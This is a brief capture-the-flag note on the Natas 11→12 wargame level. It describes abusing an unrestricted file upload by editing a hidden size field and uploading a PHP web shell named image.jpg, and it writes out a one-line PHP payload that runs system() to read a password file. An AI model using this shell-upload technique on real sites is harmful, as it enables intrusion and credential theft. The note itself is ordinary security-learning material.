# 11 -> 12

- we can upload any file $\implies$ php shell
- changed max file size in the inspector (hidden input)
- downloaded php rev shell from pentestmonkey
- I checked a writeup because I wasn't sure a reverse shell was I allowed
- Therefore I used `<?php echo system("cat /etc/natas_webpass/natas13"); ?>` as my php script and named it image.jpg
